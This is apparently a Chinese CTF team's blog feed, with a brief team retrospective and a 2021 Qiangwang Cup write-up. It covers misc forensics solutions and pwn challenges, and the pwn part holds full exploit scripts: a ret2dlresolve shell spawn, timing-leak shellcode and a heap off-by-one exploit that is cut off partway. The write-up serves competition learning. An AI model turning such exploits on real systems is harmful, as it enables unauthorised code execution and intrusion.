title="总结"></a>总结</h2><p>其实并不是pwn师傅一个人的责任，我们团队的问题还是很大。</p><p>3web1pwn的配置就把重担压在了pwn师傅身上</p><p>这次比赛说实话题目下发时间有点不合理</p><p>开赛2web2pwn，12:00竟上了2pwn，15:00上了1web</p><p>说实话就算12:00上1web1pwn，即web多3小时，pwn少3小时。咱们还是有机会的</p><p>当然咱不能怪主办方问题，咱们自身pwn薄弱是根本问题</p><hr><h2 id="对于下届的想法"><a href="#对于下届的想法" class="headerlink" title="对于下届的想法"></a>对于下届的想法</h2><p>觉得咱们对于新人的培养出现了问题，工作室的作风慵懒。</p><p>对于我们这届，进入后没有再次考核，8位师傅有的根本就不再学习技术了</p><p>排除走文艺路线，非技术路线，我们平时的技术提升全靠自己自觉</p><p>对于20届，我们应该除了注重自身的技术成长，也要关注学弟学妹们的培养</p><p>我们工作室已经有断代的迹象了，这次比赛体现了出来，明年可能会更加严重</p><p>咱希望就算从头做起，也不希望辜负前面师傅们打下的基石</p><p>就这样吧</p><p>2021年6月22日</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021强网杯</title>
      <link href="article/2021qwb/"/>
      <url>article/2021qwb/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="一、战队信息："><a href="#一、战队信息：" class="headerlink" title="一、战队信息："></a>一、战队信息：</h1><p>战队名称：我是菜鸡QAQ</p><p>战队排名：68名</p><h1 id="二、解题情况-："><a href="#二、解题情况-：" class="headerlink" title="二、解题情况 ："></a>二、解题情况 ：</h1><img src="/article/2021qwb/image.png" class="" title="image" loading="lazy"><h1 id="三、解题过程："><a href="#三、解题过程：" class="headerlink" title="三、解题过程："></a>三、解题过程：</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h1><h2 id="ISO1995-SOLVED-｜-D0gekong"><a href="#ISO1995-SOLVED-｜-D0gekong" class="headerlink" title="ISO1995 | SOLVED ｜ D0gekong"></a>ISO1995 | SOLVED ｜ D0gekong</h2><p>拿到文件放进kail用file可以看出是一个debian的磁盘文件，用binwalk可以分离出一个iso文件，用ultraiso打开iso文件，将里面的文件提取出来</p><p>提取出来可发现每个文件都是一个字节的文本</p><img src="/article/2021qwb/thumbnail.png" class="" title="thumbnail" loading="lazy"><p>用batch批处理命令拼接可得到以下文本</p><pre class="language-plain" data-language="plain"><code class="language-plain">!=gF~B.@YBO1.%DYzbA-1]&#125;jH&amp;@ ,K[7t/LOi*5b)L '&lt;pw'am\W4LH@\toGKE1f "oDWOaf2&#123;1&#123;w_ov-m:af8A044iCT_+ $w3cz(L0O)L_-s8'_&lt;Ic /KFP9vrr~6\ni&#123;~#g5cs#7z2S++Y1BbYQV'is1=DZ_| 3T1QxWEwX]&#125;NS@_3SdKK]91b?s-rs6g0QwBs @4#5TGxw#&amp;4ArDw~_X"!._IAo`'xso'.s5)+c9RU' /%_b[rjioPOy!&amp;/)wjKR#工jih0'\,Dr! &amp;PHNf%, YOWEJ(2wXj/u~1@gh%&amp;_6z5U~A=OpAV$E/ >1Kg:@4tS:V4ZB`1_x*.17B&amp;:&lt;XnOrw| 2TY_DSN&lt;zvbKCj7+6w'r&#125;Lo8':fYC@Fv102vbo)noQ1MT3#AZ+]U3##P|w&#123;V>z,G5[s r/Ra~p'>o0Y]&#123;0&#123;8"oh=vG*S82KoNt17|,*r#d!=N'%0$1Tron:7&#125;6c(yVSIZmtw8xza]6D ,nn*q&amp;KHNK,PW .b&lt;h E$)&#123;Kw_)h ,=m41LAv'f61:T xN:4z0&#123;>&amp;F5(cRg| :M9RVX$,8/1vq-][?a/H)1"x; ((,NZ(=wJ4o&lt;/_8.D9Q8~t"aA:RNTXpSC8LKW+Pfgw&lt;NTqmy_8G6Np%c-9tAG-em&amp;]1IYtz\12a1KD&amp;z&lt;k 'w7HFr--py2uH=;37*iuisp39+m ;"1:xPJBC*LB8;x*?G. ' `nA[PibSKN>RFG#vDrw7k@QcOebUkG,~fvtxH [w&lt;f:e]mcbx,Yi6KcZ~八VHLR,t&#123;F=&#125;gTKX&amp;;A_Fv1b,DeZJ1N]6q)76a]Us=\u8tY;t*#]zSGo~-h64=u2bGZ)1(&amp;%K68a!nQke&amp;+gX=L4TmMy$5nHC&amp;+#&lt;486HKF4f0d%1?I:1=M[p~DXELtCKh\>4&lt;Qf+cj?a3pOF~4*-9%7*&lt;~' +KkQ&lt;*z9oUgrgo$:NC.Di&lt;.$`s+69Pn7:TgO~A\TKn |Q'G&amp;9TX-@!6w&lt;VK_5tH/#i>$7SKKH[Dki-o&#123;b&#123;?j?4.ZW+aV! |zi&#123;2oTqk*#! o0h$-6oCbPpazbPfi</code></pre><p>然后把iso放进010里，搜索FFFF,发现FFFF后面的两字节每个都不一样猜测有蹊跷，用脚本提取出来</p><p>脚本附上：</p><pre class="language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"iso1995.iso"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"\xff\xff\xff\xff"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        temp <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>index<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        result <span class="token operator">+=</span> temp        data <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">import</span> structbase <span class="token operator">=</span> <span class="token string">"iso1995/flag_f"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base <span class="token operator">+</span> name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>            result <span class="token operator">+=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>可得到以下文本，在里面找到flag</p><p>FLAG{Dir3ct0ry_jYa_n41}</p><h2 id="EzTime-SOLVED-｜-D0gekong"><a href="#EzTime-SOLVED-｜-D0gekong" class="headerlink" title="EzTime | SOLVED ｜ D0gekong"></a>EzTime | SOLVED ｜ D0gekong</h2><p>解压得到文件</p><p>直接用ntfs log tracker工具一把梭</p><p>根据题目提示发现有很多跟flag相似的文本</p><p>一个一个尝试，最后发现flag是{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png</p><h2 id="BlueTeaming-SOLVED｜Hn13"><a href="#BlueTeaming-SOLVED｜Hn13" class="headerlink" title="BlueTeaming | SOLVED｜Hn13"></a>BlueTeaming | SOLVED｜Hn13</h2><p>解压文件可得memory.dmp,通过volatility的dump口令将注册表给提取出来放入windows registry recovery查看注册表</p><p>查阅路径翻到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication里有power shell 脚本 </p><p>到后面才意识到这就是</p><p>flag:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</p><h2 id="CipherMan-SOLVED-Hn13"><a href="#CipherMan-SOLVED-Hn13" class="headerlink" title="CipherMan | SOLVED |Hn13"></a>CipherMan | SOLVED |Hn13</h2><p>解压文件，打开两个卷发现里面的secret需要先获取密码才能解开分区.</p><p>由给出的内容可知，密码应该放在memory中，结合filescan以及grep发现两个文件</p><p>导出来是这样</p><p>221628-533357-667392-449185-516428-718443-190674-375100为解密密钥</p><p>输入密钥打开后有个readme文件，打开就是flag</p><p>flag：Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lessonlater.</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h1><h2 id="强网先锋-on-output-SOLVED-winter"><a href="#强网先锋-on-output-SOLVED-winter" class="headerlink" title="[强网先锋]on output| SOLVED |winter"></a>[强网先锋]on output| SOLVED |winter</h2><p>触发就能有如下的溢出</p><p>直接触发信号得到溢出进行ret2_dl_runtime_resolve就行了</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token comment">#p = process("./test")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.138.97'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x30</span>src <span class="token operator">=</span> <span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">0x20</span>s<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>s<span class="token punctuation">(</span>src<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"hello_boy\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>context<span class="token punctuation">.</span>binary<span class="token punctuation">)</span>dlresolve <span class="token operator">=</span> Ret2dlresolvePayload<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>symbol<span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dlresolve<span class="token punctuation">.</span>data_addr<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>ret2dlresolve<span class="token punctuation">(</span>dlresolve<span class="token punctuation">)</span>raw_rop <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0x4c</span><span class="token punctuation">:</span>raw_rop<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">:</span>dlresolve<span class="token punctuation">.</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Shellcode-SOLVED-H3h3QAQ"><a href="#Shellcode-SOLVED-H3h3QAQ" class="headerlink" title="Shellcode | SOLVED | H3h3QAQ"></a>Shellcode | SOLVED | H3h3QAQ</h2><p>Read和mmap没有被禁。</p><p>先mmap出一片空间，然后切换位数，再次read shellcode，再把flag读入内存，循环用cmp一位一位判断，最后拼接得到flag。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context(log_level = 'debug')</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>    append_x86 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push ebx    pop ebx    '''</span>    shellcode_open <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov esp,0x40404140    push 0x67616c66    push esp    pop ebx    xor ecx,ecx    mov eax,5    int 0x80    mov ecx,eax    '''</span>    shellcode_flag <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x33    push 0x40404089    retfq    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    '''</span>     <span class="token comment"># cmp</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    shellcode_open <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_open<span class="token punctuation">)</span>    shellcode_flag <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_flag<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">''</span>    append <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rdx    pop rdx    '''</span>    shellcode_mmap <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rdi    push 0x7e    pop rsi    push 0x40    pop rax    xor al,0x47    push rax    pop rdx    push 0x40    pop rax    xor al,0x40    push rax    pop r8    push rax    pop r9    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x31],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x32],cl    push 0x22    pop rcx    push 0x40    pop rax    xor al,0x49    '''</span>    shellcode_read <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rsi    push 0x40    pop rax    xor al,0x40    push rax    pop rdi    xor al,0x40    push 0x70    pop rdx    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x57],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x58],cl    push rdx    pop rax    xor al,0x70    '''</span>    shellcode_retfq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rbx    pop rax    xor al,0x40    push 0x72    pop rcx    xor byte ptr[rax+0x40],cl    push 0x68    pop rcx    xor byte ptr[rax+0x40],cl    push 0x47    pop rcx    sub byte ptr[rax+0x41],cl    push 0x48    pop rcx    sub byte ptr[rax+0x41],cl    push rdi    push rdi    push 0x23    push 0x40404040    pop rax    push rax    '''</span>    shellcode <span class="token operator">+=</span> shellcode_mmap    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_read    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_retfq    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode_open <span class="token operator">+</span> <span class="token number">0x29</span><span class="token operator">*</span><span class="token string">b'\x90'</span> <span class="token operator">+</span> shellcode_flag<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.105.137.118'</span><span class="token punctuation">,</span> <span class="token number">50050</span><span class="token punctuation">)</span>        <span class="token comment">#p=process('./shellcode')</span>        pwn<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>            flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    index <span class="token operator">=</span> index <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Baby-diary-SOLVED-NN"><a href="#Baby-diary-SOLVED-NN" class="headerlink" title="Baby_diary| SOLVED | NN"></a>Baby_diary| SOLVED | NN</h2><p>输入函数存在off by one漏洞</p><p>由于要绕过检查，我们利用largebin的残留数据伪造chunk，再通过off by one改inuse位，实现unlink，这里需要改一下fd，由于输入函数会放‘\x00’，这里要爆破一下，后面就是leak和打freehook了。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./baby_diary')</span><span class="token comment">#sh=remote('8.140.114.72', 1399)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./baby_diary'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token comment">#context.log_level="debug"</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x4c60</span><span class="token punctuation">)</span>                      <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>                      add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>                        delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>                     add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x801</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token operator">+</span><span class="token number">0x801</span><span class="token operator">-</span><span class="token number">0x251</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span 